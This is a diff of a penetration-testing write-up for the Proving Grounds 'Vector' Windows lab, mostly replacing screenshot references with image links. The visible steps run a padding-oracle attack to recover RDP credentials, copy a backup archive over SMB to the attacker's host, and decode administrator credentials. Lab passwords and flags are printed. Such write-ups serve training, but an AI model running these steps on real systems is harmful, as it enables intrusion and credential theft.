@@ -1,9 +1,13 @@
 # Vector(windows) — Proving Grounds Writeup
 
 **Platform:** Proving Grounds Practice
+
 **OS:** Windows Server 2019
+
 **Difficulty:** Hard
+
 **Job Role:** Senior Penetration Tester / Lead Penetration Tester
+
 **Tags:** Padding Oracle Attack · AES-CBC Decryption · RDP Access · RAR File Analysis · Credential Recovery
 
 ---
@@ -46,9 +50,10 @@
 nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.200.119
 ```
 
-**Screenshot — Full Nmap Scan Output:**
+<img width="1150" height="776" alt="image" src="https://github.com/user-attachments/assets/00f18d50-ad0a-4666-9b2e-54ed9a636282" />
 
-![Nmap Scan](screenshots/nmap_scan.png)
+<img width="1618" height="735" alt="image" src="https://github.com/user-attachments/assets/56457a7d-2bfc-4756-9277-09df0a9bc751" />
+
 
 **Ports Discovered:**
 
@@ -78,9 +83,8 @@ nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.200.119
 
 Navigating to `http://192.168.200.119:2290` returns an error:
 
-**Screenshot — Missing Parameter Error:**
+<img width="915" height="174" alt="image" src="https://github.com/user-attachments/assets/ea697ebc-d8b9-41e7-bbd6-4f37f2ca23a4" />
 
-![Missing Parameter Error](screenshots/port2290_missing_param.png)
 
 ```
 ERROR: missing parameter "c"
@@ -92,9 +96,9 @@ The application requires a `c` parameter. Testing with a random value:
 http://192.168.200.119:2290/?c=123123
 ```
 
-**Screenshot — Parameter Response Returns 0:**
+<img width="910" height="185" alt="image" src="https://github.com/user-attachments/assets/5dc38dee-77bf-43ae-8991-a0bb511ed37d" />
 
-![Parameter Response](screenshots/port2290_param_response.png)
+
 
 The application returns `0` — a binary true/false response based on whether the submitted ciphertext is valid.
 
@@ -102,9 +106,7 @@ The application returns `0` — a binary true/false response based on whether th
 
 Inspecting the page source reveals critical information:
 
-**Screenshot — HTML Source Code with AES Ciphertext:**
-
-![Source Code AES Ciphertext](screenshots/source_code_aes.png)
+https://pulsesecurity.co.nz/articles/dotnet-padding-oracles
 
 ```html
 <head></head><body><form method="post" action="./?c=123123" id="MyForm">
@@ -152,9 +154,8 @@ git clone https://github.com/mpgn/Padding-oracle-attack.git
 cd Padding-oracle-attack
 ```
 
-**Screenshot — Tool Cloned Successfully:**
+<img width="1058" height="248" alt="image" src="https://github.com/user-attachments/assets/1631830c-64d4-4dcb-9370-9fbba3c811f1" />
 
-![Git Clone](screenshots/git_clone_padding_oracle.png)
 
 ### Step 2 — Add Host Entry
 
@@ -164,9 +165,8 @@ Map the target IP to the hostname used by the exploit:
 echo "192.168.200.119 box.os" | sudo tee -a /etc/hosts
 ```
 
-**Screenshot — /etc/hosts Updated:**
+<img width="863" height="99" alt="image" src="https://github.com/user-attachments/assets/c7a42d07-e637-48be-8ebf-07547179b9bc" />
 
-![Hosts File Updated](screenshots/hosts_file_update.png)
 
 ```
 192.168.200.119 box.os
@@ -194,9 +194,8 @@ python exploit.py \
 | `-u` | `/?c=` | URL parameter to inject ciphertext |
 | `--error` | `<span id="MyLabel">0</span>` | Error string indicating invalid padding |
 
-**Screenshot — Padding Oracle Attack Running:**
+<img width="828" height="102" alt="image" src="https://github.com/user-attachments/assets/12be05f3-6e5f-47b7-9f49-d6fb6710a311" />
 
-![Padding Oracle Attack](screenshots/padding_oracle_attack.png)
 
 **Exploit Output:**
 
@@ -222,9 +221,8 @@ password : WormAloeVat7
 xfreerdp /v:box.os:3389 /u:victor /p:WormAloeVat7
 ```
 
-**Screenshot — Windows Desktop via RDP:**
+<img width="1055" height="796" alt="image" src="https://github.com/user-attachments/assets/3d875633-278e-4660-a502-665bb56404f8" />
 
-![Windows Desktop RDP](screenshots/rdp_windows_desktop.png)
 
 Successfully connected to the Windows desktop as **victor**. The `local.txt` file is visible directly on the desktop.
 
@@ -254,9 +252,8 @@ cd downloads
 dir
 ```
 
-**Screenshot — backup.rar in Downloads Folder:**
+<img width="702" height="308" alt="image" src="https://github.com/user-attachments/assets/b19679ec-9219-4b2a-b635-38f3f6f59447" />
 
-![backup.rar Found](screenshots/backup_rar_found.png)
 
 ```
 Directory of C:\Users\victor\Downloads
@@ -282,9 +279,8 @@ net use \\192.168.45.216\share /user:victor WormAloeVat7
 copy backup.rar \\192.168.45.216\share\
 ```
 
-**Screenshot — SMB File Transfer:**
+<img width="768" height="401" alt="image" src="https://github.com/user-attachments/assets/779063b0-c965-4212-9a51-4b3086241f69" />
 
-![SMB Transfer](screenshots/smb_transfer.png)
 
 ```
 The command completed successfully.
@@ -301,9 +297,10 @@ unrar e ./backup.rar
 # Enter password: WormAloeVat7
 ```
 
-**Screenshot — RAR Extraction with victor's Password:**
+<img width="1462" height="286" alt="image" src="https://github.com/user-attachments/assets/3e64f450-81e3-42ab-9753-ca59055453c8" />
 
-![Unrar Success](screenshots/unrar_extraction.png)
+<img width="948" height="367" alt="image" src="https://github.com/user-attachments/assets/372eb9a0-4ff1-417c-a47c-dd1606ae63a4" />
+
 
 ```
 UNRAR 7.23 freeware
@@ -321,9 +318,8 @@ cat backup.txt
 cat backup.txt | base64 -d
 ```
 
-**Screenshot — Base64 Decoded Administrator Credentials:**
+<img width="948" height="367" alt="image" src="https://github.com/user-attachments/assets/c8dc87d5-3b5f-4b8d-a148-2e6c6c0d2d24" />
 
-![Base64 Decoded](screenshots/base64_decode.png)
 
 ```
 Administrator:EverywayLabelWrap375
@@ -354,9 +350,8 @@ dir
 type proof.txt
 ```
 
-**Screenshot — Administrator Desktop & proof.txt:**
+<img width="664" height="359" alt="image" src="https://github.com/user-attachments/assets/84c104d7-15a0-4713-a73a-bcfec140e0af" />
 
-![Administrator Access](screenshots/admin_proof_txt.png)
 
 ```
 C:\Users\Administrator\Desktop>type proof.txt
@@ -375,9 +370,8 @@ C:\Users\Administrator\Desktop>type proof.txt
 5b874b83bf866a069c748f35efde2784
 ```
 
-**Screenshot — local.txt:**
+<img width="1043" height="640" alt="image" src="https://github.com/user-attachments/assets/9d9de7dd-ceb9-4f22-b29a-b34e6236f87a" />
 
-![local.txt](screenshots/local_txt.png)
 
 ### proof.txt (Administrator's Desktop)
 
@@ -386,9 +380,8 @@ C:\Users\Administrator\Desktop>type proof.txt
 91d17e6661075569d38804b00931372b
 ```
 
-**Screenshot — proof.txt:**
+<img width="664" height="359" alt="image" src="https://github.com/user-attachments/assets/e47aa699-e293-4d09-94b8-9b575c2937bd" />
 
-![proof.txt](screenshots/proof_txt.png)
 
 ---
 
@@ -537,5 +530,5 @@ Target: 192.168.200.119 (VECTOR)
 ---
 
 **Platform:** OffSec Proving Grounds Practice
-**Author:** Tanvir Ahmed | [tanvirkarim.it](https://tanvirkarim.it)
-**GitHub:** [github.com/Tanvir-2](https://github.com/Tanvir-2)
+
+**Author:** Tanvir Ahmed 
